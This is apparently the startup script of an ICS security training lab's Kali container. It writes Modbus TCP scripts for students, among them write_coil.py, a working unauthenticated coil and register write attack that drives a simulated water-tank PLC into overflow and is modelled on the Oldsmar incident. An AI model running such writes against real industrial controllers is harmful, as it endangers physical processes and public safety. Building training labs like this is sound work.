#!/bin/bash
# entrypoint.sh — Kali attack machine container startup
#
# Startup sequence:
#   1. Print device identity and available tools
#   2. Start TigerVNC server on display :1 (port 5901)
#      TigerVNC automatically runs ~/.config/tigervnc/xstartup, which calls
#      dbus-launch --exit-with-session startxfce4. No separate Xfce4 launch needed.
#   3. Wait for VNC socket + TCP readiness (nc probes) before starting websockify
#   4. Start websockify to bridge noVNC WebSocket (port 6080) → VNC TCP (5901)
#   5. Keep the container alive for docker exec terminal sessions
#
# Port map:
#   5901  — VNC TCP (internal; not published to host)
#   6080  — noVNC WebSocket (published to host via Docker Compose port mapping)
#           Accessible in the Electron Desktop view at http://localhost:<hostPort>/vnc.html

set -e

echo "[otforge-attack] =============================================="
echo "[otforge-attack] Device:   ${DEVICE_ID}"
echo "[otforge-attack] Category: ${DEVICE_CATEGORY}"
echo "[otforge-attack] Zone:     External network (attacker-controlled)"
echo "[otforge-attack] =============================================="
echo ""
echo "[otforge-attack] CLI Tools:     nmap, masscan, netcat, tshark, scapy, pymodbus"
echo "[otforge-attack] Frameworks:    metasploit-framework, armitage"
echo "[otforge-attack] Passwords:     hydra, medusa, john, hashcat"
echo "[otforge-attack] ICS Protocol:  pymodbus, dnp3-python, opcua, bacpypes3, python-snap7"
echo "[otforge-attack] Desktop:       Xfce4 via noVNC at container port 6080"
echo "[otforge-attack]                (Wireshark GUI, Armitage, Firefox available)"
echo ""

# ── Network interface report + route repair ───────────────────────────────────
echo "[otforge-attack] Network interfaces:"
ip addr show
echo ""

# On Docker Desktop for Windows, subnet routes for secondary (non-default) network
# interfaces are sometimes absent from the routing table, especially for bridge
# networks created with 'internal: true'. Without these routes, traffic to the
# internet-dmz or ot subnets is sent via the default route (attacker-net) and
# returns EHOSTUNREACH because those hosts are not reachable from that bridge.
#
# Fix: iterate every eth* interface, derive its /24 subnet, and add an explicit
# 'scope link' route for that subnet if one is not already present.
echo "[otforge-attack] Verifying subnet routes for all interfaces..."
for IFACE in $(ip -o link show | awk -F': ' '{print $2}' | grep '^eth'); do
    ADDR=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2}' | head -1)
    [ -z "$ADDR" ] && continue
    # Derive network/prefix from the assigned address (e.g., 10.200.50.250/24 → 10.200.50.0/24)
    NETWORK=$(python3 -c "
import ipaddress, sys
try:
    iface = ipaddress.ip_interface('$ADDR')
    print(str(iface.network))
except Exception:
    sys.exit(1)
" 2>/dev/null) || continue
    if ip route show dev "$IFACE" 2>/dev/null | grep -qF "$NETWORK"; then
        echo "[otforge-attack]   $IFACE  $NETWORK  (route OK)"
    else
        ip route add "$NETWORK" dev "$IFACE" 2>/dev/null && \
            echo "[otforge-attack]   $IFACE  $NETWORK  (route ADDED)" || \
            echo "[otforge-attack]   $IFACE  $NETWORK  (route add failed — may need NET_ADMIN)"
    fi
done
echo ""

# ── Start TigerVNC server ─────────────────────────────────────────────────────
echo "[otforge-attack] Starting TigerVNC server on display :1 (port 5901)..."

# Clean up any stale lock files from a previous unclean shutdown
rm -f /tmp/.X1-lock /tmp/.X11-unix/X1 2>/dev/null || true

# Geometry matches a standard 16:9 monitor — suitable for Wireshark's layout.
# -SecurityTypes None: password-free VNC — safe because port 5901 is not
#   published to the host; VNC is only reachable via websockify on port 6080.
# -localhost yes: bind VNC to 127.0.0.1 only (not all interfaces) so that newer
#   TigerVNC versions do NOT reject the start-up. websockify connects to
#   localhost:5901, so binding to loopback is sufficient. Using -localhost no with
#   -SecurityTypes None causes TigerVNC ≥ 1.14 to refuse with a security error.
vncserver :1 \
    -geometry 1920x1080 \
    -depth 24 \
    -localhost yes \
    -SecurityTypes None \
    -fg &
VNC_PID=$!

# Wait for VNC socket to appear before starting websockify
for i in $(seq 1 15); do
    if [ -S /tmp/.X11-unix/X1 ] || ss -tln | grep -q ':5901'; then
        echo "[otforge-attack] VNC server ready (attempt ${i})"
        break
    fi
    sleep 1
done

# ── Xfce4 is launched via VNC xstartup, not here ─────────────────────────────
# TigerVNC automatically executes ~/.config/tigervnc/xstartup after creating the
# X session. That script runs `dbus-launch --exit-with-session startxfce4`, which
# is the correct single launch path.
#
# We deliberately do NOT start startxfce4 here. A second call would start a second
# Xfce4 instance on the same display — its xfwm4 would fail with "Another Window
# Manager is already running", leaving the desktop without titlebars and resize handles.

# Wait for TigerVNC to actually accept TCP connections on port 5901 before starting
# websockify. The socket-file / port check above confirmed VNC started, but there is
# a brief window where TigerVNC has the socket open but rejects incoming connections
# while it finishes initialising the X session. A TCP connection probe is more
# reliable than a sleep-based heuristic.
echo "[otforge-attack] Waiting for VNC to accept TCP connections on port 5901..."
for i in $(seq 1 20); do
    # Try a TCP connection; nc exits 0 immediately on success, 1 on refused/timeout
    if nc -z -w1 localhost 5901 2>/dev/null; then
        echo "[otforge-attack] VNC accepting connections (attempt ${i})"
        break
    fi
    sleep 1
done

# ── Start noVNC WebSocket bridge ─────────────────────────────────────────────
# websockify translates WebSocket frames from the Electron BrowserWindow (noVNC page)
# into raw VNC TCP frames that TigerVNC understands. The --wrap-mode=ignore flag
# prevents websockify from exiting when the VNC connection drops (e.g. client refresh).
echo "[otforge-attack] Starting noVNC websockify bridge on port 6080..."
websockify \
    --web /opt/novnc/ \
    --wrap-mode=ignore \
    0.0.0.0:6080 \
    localhost:5901 &
NOVNC_PID=$!

# Verify websockify is listening on port 6080 before declaring the container ready.
# Without this check the host-side isPortOpen() probe may succeed while websockify
# is still in its startup phase and the WebSocket handshake fails.
echo "[otforge-attack] Waiting for noVNC websockify to listen on port 6080..."
for i in $(seq 1 15); do
    if nc -z -w1 localhost 6080 2>/dev/null; then
        echo "[otforge-attack] noVNC ready on port 6080 (attempt ${i})"
        break
    fi
    sleep 1
done

echo "[otforge-attack] Desktop ready — connect at container port 6080"
echo "[otforge-attack] VNC: no password required (SecurityTypes None; isolated within Docker network)"
echo ""
echo "[otforge-attack] Waiting for terminal sessions (docker exec)..."

# ── Create Attack_Scripts desktop directory ───────────────────────────────────
# Populate /root/Desktop/Attack_Scripts/ with ready-to-run pymodbus scripts so
# students can immediately interact with the PLC without writing any code.
# PLC_IP and PLC_PORT are injected by compose-generator.ts from the scenario's
# first PLC device; scripts read them from the environment at runtime.

mkdir -p /root/Desktop/Attack_Scripts

# ── read_coils.py ─────────────────────────────────────────────────────────────
# Connects to the PLC and prints coil states plus holding register values.
# No writes — safe to run at any time for reconnaissance/observation.
cat > /root/Desktop/Attack_Scripts/read_coils.py << 'PYEOF'
#!/usr/bin/env python3
"""
read_coils.py — Read PLC coil and holding-register state via Modbus TCP.

Usage:
    python3 read_coils.py

Environment variables (set automatically by the simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)

Coil map (Tutorial 01 — pump_control program):
    Coil 0  pump_run     FALSE=pump off,     TRUE=pump on
    Coil 1  valve_open   FALSE=valve closed, TRUE=valve open
    Coil 2  emrg_stop    FALSE=normal,       TRUE=emergency tripped

Holding register map (OpenPLC %MW variables start at Modbus address 1024):
    HR 1024  tank_level   Tank level in cm  (500 = 5.00 m, 1000 = 10.00 m overflow)
    HR 1025  inlet_flow   Inlet flow rate   (L/min; >0 means pump is running)
    HR 1026  outlet_flow  Outlet flow rate  (L/min; >0 means valve is open)
"""

import os
import sys

try:
    from pymodbus.client import ModbusTcpClient
    from pymodbus.exceptions import ModbusException
except ImportError:
    print("[error] pymodbus not installed. Run: pip3 install pymodbus")
    sys.exit(1)

# PLC_IP and PLC_PORT are injected into the container environment by
# compose-generator.ts so students do not need to look up the IP manually.
PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

COIL_LABELS = {
    0: 'pump_run     (inlet pump)',
    1: 'valve_open   (outlet valve)',
    2: 'emrg_stop    (emergency stop)',
}
REG_LABELS = {
    0: 'tank_level   (cm)',
    1: 'inlet_flow   (L/min)',
    2: 'outlet_flow  (L/min)',
}

print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT} ...")
client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

# pymodbus 3.x may raise on connection failure instead of returning False
try:
    connected = client.connect()
except Exception as e:
    connected = False
    print(f"[error] Connection exception: {e}")

if not connected:
    print(f"[error] Connection refused — is the simulation running?  ({PLC_IP}:{PLC_PORT})")
    sys.exit(1)

print(f"[+] Connected\n")

# ── FC01 Read Coils 0–2 ───────────────────────────────────────────────────────
print("=== COILS  (Modbus FC01 — Read Coils) ===")
try:
    coil_result = client.read_coils(address=0, count=3, device_id=1)
    if hasattr(coil_result, 'isError') and coil_result.isError():
        print(f"[error] read_coils failed: {coil_result}")
    else:
        for idx in range(3):
            state = "ON  (TRUE) " if coil_result.bits[idx] else "OFF (FALSE)"
            label = COIL_LABELS.get(idx, f'coil_{idx}')
            print(f"  Coil {idx}  {label:<35} {state}")
except (ModbusException, Exception) as e:
    print(f"[error] read_coils raised exception: {e}")

print()

# ── FC03 Read Holding Registers 0–2 ──────────────────────────────────────────
print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
try:
    # OpenPLC %MW variables start at Modbus HR address 1024 (MIN_16B_RANGE in modbus.cpp).
    reg_result = client.read_holding_registers(address=1024, count=3, device_id=1)
    if hasattr(reg_result, 'isError') and reg_result.isError():
        print(f"[error] read_holding_registers failed: {reg_result}")
    else:
        for idx in range(3):
            raw   = reg_result.registers[idx]
            label = REG_LABELS.get(idx, f'reg_{idx}')
            # HR 1024 stores level in cm — show human-readable meters alongside
            display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
            print(f"  HR{1024+idx}  {label:<35} {display}")
except (ModbusException, Exception) as e:
    print(f"[error] read_holding_registers raised exception: {e}")

print()
client.close()
print("[+] Done — no writes performed")
PYEOF

# ── write_coil.py ─────────────────────────────────────────────────────────────
# Default (no args): executes the attack — pump ON + outlet valve CLOSED →
# water flows in with no outflow, causing a tank overflow.
# --restore flag: returns the PLC to its normal safe operating state.
cat > /root/Desktop/Attack_Scripts/write_coil.py << 'PYEOF'
#!/usr/bin/env python3
"""
write_coil.py — Modbus coil write attack against the Tutorial 01 water treatment PLC.

Default action  (no flags):  ATTACK  — close outlet valve, keep pump running.
                              Inlet water accumulates with no outlet path.
                              After writing the coil, a timed loop directly
                              increments HR 1024 (tank_level %MW0) by 5 cm every
                              500 ms via FC06 Write Single Register so the overflow
                              is immediately visible in the OT canvas animation.

With --restore:              RESTORE — reopen the outlet valve only (Coil 1 → TRUE).
                              The pump coil is NOT touched; it was not part of the
                              attack and the restore undoes only what was changed.
                              With valve open and pump running, inlet = outlet = 120
                              L/min so the level stabilises at its current value.
                              Run plc_init.py separately to reset level to 500 cm.

Both modes keep the Modbus connection open for the duration of the loop.
Press Ctrl+C at any time to stop the loop (coil states remain on the PLC).

This replicates the 2021 Oldsmar, Florida water treatment attack: Modbus TCP
carries no authentication — any host on the OT network can write any coil or
register on any PLC with zero credentials required.

Usage:
    python3 write_coil.py           # execute attack + watch tank rise
    python3 write_coil.py --restore # restore safe state + watch tank drain

Environment variables (set automatically by the simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os
import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
    from pymodbus.exceptions import ModbusException
except ImportError:
    print("[error] pymodbus not installed. Run: pip3 install pymodbus")
    sys.exit(1)

# ── Mode selection ────────────────────────────────────────────────────────────
RESTORE_MODE = '--restore' in sys.argv

# ── Connection parameters ─────────────────────────────────────────────────────
PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

if RESTORE_MODE:
    VALVE_STATE = True
    mode_label  = "RESTORE — reopen outlet valve only (pump not touched)"
else:
    PUMP_STATE  = True
    VALVE_STATE = False
    mode_label  = "ATTACK  — pump ON + outlet valve CLOSED (overflow)"

print(f"[*] Mode:      {mode_label}")
print(f"[*] Target:    {PLC_IP}:{PLC_PORT}")
if not RESTORE_MODE:
    print(f"[*] Coil 0 → {'TRUE  (pump ON)'    if PUMP_STATE  else 'FALSE (pump OFF)'}")
print(f"[*] Coil 1 → {'TRUE  (valve OPEN)' if VALVE_STATE else 'FALSE (valve CLOSED)'}")
print()
print(f"[*] Connecting to PLC ...")

client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

try:
    connected = client.connect()
except Exception as e:
    connected = False
    print(f"[error] Connection exception: {e}")

if not connected:
    print(f"[error] Connection refused — is the simulation running?  ({PLC_IP}:{PLC_PORT})")
    sys.exit(1)

print(f"[+] Connected — sending Modbus FC05 (Write Single Coil) frames ...\n")

# ── Write Coil 0 — inlet pump (attack mode only) ──────────────────────────────
# Restore mode deliberately does NOT write Coil 0.  The attack only closed the
# outlet valve; the pump was not changed, so the restore undoes only that change.
if not RESTORE_MODE:
    try:
        r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
        if hasattr(r0, 'isError') and r0.isError():
            print(f"[error] write_coil(0) returned error: {r0}")
            client.close(); sys.exit(1)
    except (ModbusException, Exception) as e:
        print(f"[error] write_coil(0) raised exception: {e}")
        client.close(); sys.exit(1)
    print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 ACK'd")

# ── Write Coil 1 — outlet valve ───────────────────────────────────────────────
try:
    r1 = client.write_coil(address=1, value=VALVE_STATE, device_id=1)
    if hasattr(r1, 'isError') and r1.isError():
        print(f"[error] write_coil(1) returned error: {r1}")
        client.close(); sys.exit(1)
except (ModbusException, Exception) as e:
    print(f"[error] write_coil(1) raised exception: {e}")
    client.close(); sys.exit(1)
print(f"[+] Coil 1 (outlet valve)  → {'TRUE  (OPEN)' if VALVE_STATE else 'FALSE (CLOSED)'} — FC05 ACK'd")
print()

# ── Helper: render a text progress bar for the tank level ────────────────────
def _bar(level):
    """Return a formatted one-line status string for the given level (0–1000)."""
    lvl  = max(0, min(level, 1000))
    pct  = lvl / 10.0
    n    = int(pct / 5)
    bar  = '█' * n + '░' * (20 - n)
    if   pct < 50:  tag = "NORMAL  "
    elif pct < 80:  tag = "ELEVATED"
    elif pct < 100: tag = "CRITICAL"
    else:           tag = "OVERFLOW"
    return f"  [{bar}] {lvl:4d} cm  ({pct:5.1f}%)  {tag}"


if not RESTORE_MODE:
    # ── ATTACK mode ───────────────────────────────────────────────────────────
    print("[+] ATTACK COMPLETE — PLC is now in an unsafe state.")
    print("    Coil 0 = TRUE  (pump ON)  | Coil 1 = FALSE (valve CLOSED)")
    print("    Inlet water is accumulating — tank overflow imminent.")
    print("    To restore:  python3 write_coil.py --restore")
    print()

    # OpenPLC maps %MW0 (tank_level) to Modbus HR address 1024, not address 0.
    # Addresses 0–1023 are %IW/%QW input/output words; reading them returns zeroes.
    # If the PLC baseline was not pre-seeded by the init script (level < 50 cm),
    # seed HR 1024 to 500 cm now so the overflow effect starts from a visible level.
    try:
        chk = client.read_holding_registers(address=1024, count=1, device_id=1)
        if not (hasattr(chk, 'isError') and chk.isError()):
            if chk.registers[0] < 50:
                client.write_register(address=1024, value=500, device_id=1)
                print("[*] Tank level seeded to 500 cm (init script had not run).")
    except Exception:
        pass

    # Timed rise loop — reads HR 1024 (%MW0 = tank_level), adds 5 cm, writes back every 500 ms.
    # Combined with the PLC scan (+5 cm/scan at 500 ms), the level rises at
    # roughly 20 cm/s — visible overflow from 500 cm in about 25 seconds.
    print("[*] Incrementing tank level 5 cm every 500 ms via FC06 Write Register.")
    print("[*] Watch the Water Tank icon in the OT canvas. Press Ctrl+C to stop.\n")
    try:
        while True:
            try:
                reg = client.read_holding_registers(address=1024, count=1, device_id=1)
                if not (hasattr(reg, 'isError') and reg.isError()):
                    lvl     = min(reg.registers[0], 1000)
                    new_lvl = min(lvl + 5, 1000)
                    client.write_register(address=1024, value=new_lvl, device_id=1)
                    print(f"\r{_bar(new_lvl)}", end='', flush=True)
                    if new_lvl >= 1000:
                        print()
                        print()
                        print("[!] OVERFLOW — tank at 1000 cm (10.00 m)!")
                        print("[!] Run  python3 write_coil.py --restore  to recover.")
                        break
            except (ModbusException, Exception):
                pass
            time.sleep(0.5)
    except KeyboardInterrupt:
        print()
        print("[*] Monitoring stopped. Coil states remain — attack is still active.")

else:
    # ── RESTORE mode ──────────────────────────────────────────────────────────
    # Only Coil 1 (valve_open) was written above — Coil 0 (pump_run) is left
    # exactly as the PLC had it before the attack.  With valve OPEN and pump
    # still ON, inlet flow = outlet flow = 120 L/min → level stabilises.
    print("[+] Valve restored — outlet open.")
    print("    Coil 1 = TRUE (valve OPEN)  |  Coil 0 unchanged (pump still running)")
    print()
    # Read current level so the student can see the stabilised state
    try:
        reg = client.read_holding_registers(address=1024, count=3, device_id=1)
        if not (hasattr(reg, 'isError') and reg.isError()):
            lvl    = reg.registers[0]
            q_in   = reg.registers[1]
            q_out  = reg.registers[2]
            print(f"[*] Current state:  tank_level={lvl} cm  inlet_flow={q_in} L/min  outlet_flow={q_out} L/min")
            print(f"[*] {_bar(lvl)}")
    except Exception:
        pass
    print()
    print("[*] The process is no longer in a fault condition.")
    print("[*] Inlet and outlet flows are balanced — level will not rise further.")
    print("[*] To reset the tank to 500 cm (50% baseline), run:")
    print("[*]   python3 /root/Desktop/Attack_Scripts/plc_init.py")

client.close()
PYEOF

chmod +x /root/Desktop/Attack_Scripts/read_coils.py
chmod +x /root/Desktop/Attack_Scripts/write_coil.py

# ── plc_init.py ────────────────────────────────────────────────────────────────
# Writes the safe operating baseline to the PLC via Modbus TCP at simulation
# start. Required because OpenPLC zeros ALL AT-mapped outputs (%QX) and memory
# words (%MW) at container startup, ignoring any initial values declared in the
# IEC 61131-3 Structured Text program (e.g. := TRUE). This script is invoked
# automatically in the background below; it is also exposed on the Desktop so
# students can re-seed the PLC manually if needed.
#
# Baseline state written:
#   Coil 0 (pump_run)   → TRUE  — inlet pump ON
#   Coil 1 (valve_open) → TRUE  — outlet valve OPEN
#   HR 0   (tank_level) → 500   — 50% capacity (5.00 m), balanced inflow/outflow
cat > /root/Desktop/Attack_Scripts/plc_init.py << 'PYEOF'
#!/usr/bin/env python3
"""
plc_init.py — Seed the PLC Modbus registers to their safe operating baseline.

Called automatically at container start; also available for manual re-seeding.
Writes Coil 0 (pump ON), Coil 1 (valve OPEN), and HR 0 (tank_level = 500 cm).

Environment variables (set automatically by the simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os
import sys

try:
    from pymodbus.client import ModbusTcpClient
    from pymodbus.exceptions import ModbusException
except ImportError:
    print("[plc-init] pymodbus not installed — skipping baseline seed")
    sys.exit(0)

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

try:
    connected = client.connect()
except Exception as e:
    print(f"[plc-init] connect exception: {e}")
    sys.exit(1)

if not connected:
    print(f"[plc-init] could not connect to {PLC_IP}:{PLC_PORT}")
    sys.exit(1)

success = True

# ── Coil 0: pump_run → TRUE (inlet pump ON) ───────────────────────────────────
try:
    r = client.write_coil(address=0, value=True, device_id=1)
    if hasattr(r, 'isError') and r.isError():
        print(f"[plc-init] write_coil(0) error: {r}")
        success = False
    else:
        print("[plc-init] Coil 0 (pump_run)   → TRUE  (pump ON)")
except (ModbusException, Exception) as e:
    print(f"[plc-init] write_coil(0) exception: {e}")
    success = False

# ── Coil 1: valve_open → TRUE (outlet valve OPEN) ────────────────────────────
try:
    r = client.write_coil(address=1, value=True, device_id=1)
    if hasattr(r, 'isError') and r.isError():
        print(f"[plc-init] write_coil(1) error: {r}")
        success = False
    else:
        print("[plc-init] Coil 1 (valve_open) → TRUE  (valve OPEN)")
except (ModbusException, Exception) as e:
    print(f"[plc-init] write_coil(1) exception: {e}")
    success = False

# ── HR 1024: tank_level → 500 (5.00 m, 50% capacity) ─────────────────────────
# OpenPLC maps %MW0 (tank_level) to Modbus HR address 1024 (MIN_16B_RANGE).
try:
    r = client.write_register(address=1024, value=500, device_id=1)
    if hasattr(r, 'isError') and r.isError():
        print(f"[plc-init] write_register(HR1024) error: {r}")
        success = False
    else:
        print("[plc-init] HR 1024 (tank_level)  → 500   (5.00 m, 50% capacity)")
except (ModbusException, Exception) as e:
    print(f"[plc-init] write_register(HR0) exception: {e}")
    success = False

client.close()

if success:
    print("[plc-init] PLC baseline state seeded successfully.")
    sys.exit(0)
else:
    print("[plc-init] One or more writes failed — baseline may be incomplete.")
    sys.exit(1)
PYEOF

chmod +x /root/Desktop/Attack_Scripts/plc_init.py

# ── monitor_level.py ──────────────────────────────────────────────────────────
# Continuously polls HR 1024 (tank_level %MW0) and displays a live ASCII bar.
# Run this in one terminal while write_coil.py runs in another to observe the
# rising level numerically, mirroring what the OT canvas animation shows.
cat > /root/Desktop/Attack_Scripts/monitor_level.py << 'PYEOF'
#!/usr/bin/env python3
"""
monitor_level.py — Live tank-level monitor for Tutorial 01.

Polls HR 1024 (%MW0 = tank_level on OpenPLC) every 1 second and prints a
continuously-updating ASCII bar graph so students can see the rising level
numerically in the terminal as the attack progresses.

Usage:
    python3 monitor_level.py           # poll every 1 s (default)
    python3 monitor_level.py --fast    # poll every 0.5 s
    Press Ctrl+C to stop.

Environment variables (set automatically by the simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)

OpenPLC Modbus register map:
    HR 1024  tank_level   cm   (0 = empty, 1000 = overflow at 10.00 m)
    HR 1025  inlet_flow   L/min
    HR 1026  outlet_flow  L/min
"""

import os
import sys
import time

try:
    from pymodbus.client import ModbusTcpClient
    from pymodbus.exceptions import ModbusException
except ImportError:
    print("[error] pymodbus not installed. Run: pip3 install pymodbus")
    sys.exit(1)

PLC_IP    = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT  = int(os.environ.get('PLC_PORT', '502'))
INTERVAL  = 0.5 if '--fast' in sys.argv else 1.0

client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
try:
    connected = client.connect()
except Exception as e:
    connected = False
    print(f"[error] Connection exception: {e}")

if not connected:
    print(f"[error] Cannot connect to {PLC_IP}:{PLC_PORT} — is the simulation running?")
    sys.exit(1)

print(f"[*] Connected to {PLC_IP}:{PLC_PORT}  (poll interval: {INTERVAL:.1f} s)")
print(f"[*] Monitoring HR 1024 (tank_level), HR 1025 (inlet_flow), HR 1026 (outlet_flow)")
print(f"[*] Press Ctrl+C to stop.\n")
print(f"  {'LEVEL BAR':^42}  LEVEL    PCT    IN     OUT    STATUS")
print(f"  {'─'*42}  {'─'*6}  {'─'*5}  {'─'*6}  {'─'*6}  {'─'*8}")

try:
    while True:
        try:
            # Read HR 1024–1026: tank_level, inlet_flow, outlet_flow
            result = client.read_holding_registers(address=1024, count=3, device_id=1)
            if hasattr(result, 'isError') and result.isError():
                print("\r  [error reading registers]", end='', flush=True)
            else:
                lvl     = min(result.registers[0], 1000)
                q_in    = result.registers[1]
                q_out   = result.registers[2]
                pct     = lvl / 10.0
                n_fill  = int(pct / 5)       # 0–20 filled blocks
                bar     = '█' * n_fill + '░' * (20 - n_fill)

                if   pct < 50:  status = "NORMAL  "
                elif pct < 80:  status = "ELEVATED"
                elif pct < 100: status = "CRITICAL"
                else:           status = "OVERFLOW"

                print(
                    f"\r  [{bar}]  {lvl:4d}cm  {pct:5.1f}%  "
                    f"{q_in:5d}  {q_out:5d}  {status}",
                    end='', flush=True
                )
        except (ModbusException, Exception) as e:
            print(f"\r  [poll error: {e}]", end='', flush=True)

        time.sleep(INTERVAL)

except KeyboardInterrupt:
    print("\n[*] Monitoring stopped.")
    client.close()
PYEOF

chmod +x /root/Desktop/Attack_Scripts/monitor_level.py

echo "[otforge-attack] Attack_Scripts created:"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py    — read coil + register state (one-shot)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py    — coil write attack (--restore to undo)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py      — re-seed PLC baseline (pump=ON, valve=OPEN, level=500)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py — live tank-level bar (--fast for 0.5 s poll)"

# ── PLC Modbus baseline initialization ────────────────────────────────────────
# Runs in the background so VNC/noVNC startup is not delayed.
# Polls PLC_IP:PLC_PORT every 2 s for up to 30 s, then writes the baseline
# state once the PLC's Modbus listener is accepting connections.
# This is necessary because OpenPLC zeros all AT-mapped I/O at container start,
# overriding any initial values in the ST program.
(
    _PLC_IP="${PLC_IP:-10.200.10.10}"
    _PLC_PORT="${PLC_PORT:-502}"
    echo "[otforge-attack] [plc-init] Waiting for PLC at ${_PLC_IP}:${_PLC_PORT}..."
    for i in $(seq 1 15); do
        if nc -z -w1 "${_PLC_IP}" "${_PLC_PORT}" 2>/dev/null; then
            echo "[otforge-attack] [plc-init] PLC reachable (attempt ${i}) — seeding baseline..."
            python3 /root/Desktop/Attack_Scripts/plc_init.py
            exit $?
        fi
        echo "[otforge-attack] [plc-init] Not reachable yet (attempt ${i}/15) — waiting 2 s..."
        sleep 2
    done
    echo "[otforge-attack] [plc-init] PLC did not become reachable within 30 s — skipping baseline seed."
    exit 1
) &

# ── Keep container alive ──────────────────────────────────────────────────────
# The Electron xterm.js terminal attaches via `docker exec -i <name> /bin/bash`.
# The process here just holds the container open; exec sessions are independent.
exec tail -f /dev/null
